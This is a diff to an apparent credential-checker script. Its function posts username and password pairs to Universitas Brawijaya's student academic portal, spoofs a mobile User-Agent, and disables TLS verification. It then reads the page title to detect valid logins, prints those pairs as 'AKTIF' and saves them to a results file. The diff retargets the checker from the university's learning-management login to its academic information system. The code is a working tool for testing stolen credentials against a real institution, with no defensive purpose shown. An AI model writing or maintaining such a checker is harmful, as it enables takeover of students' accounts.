@@ -496,12 +496,14 @@ def unusa(usr, pwd):
 
 
 def ub(usr, pwd):
-    url = 'https://vlm.ub.ac.id/login/index.php/'
+    ses = req.Session()
+    url = 'https://siam.ub.ac.id/index.php'
     dat = {'username':usr,  'password':pwd, 
-     'submit':'login'}
-    raw = req.post(url, data=dat, verify=False, timeout=10).text
-    res = bs(raw, 'html.parser').title.get_text()
-    if res == 'Virtual Learning Management Universitas Brawijaya':
+     'login':'submit'}
+    headers = {'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'}
+    raw = ses.post(url, headers=headers, data=dat, verify=False).text 
+    res = bs(raw, 'html.parser').find("title")
+    if res.text == 'Sistem Informasi Akademik Mahasiswa':
         print(f" {white}[{green}AKTIF{white}]{green}{white}->{green} {usr}{white}:{green}{pwd}")
         sukses.append(f"{usr}")
         with open('hasil_ub.txt', 'a') as save:
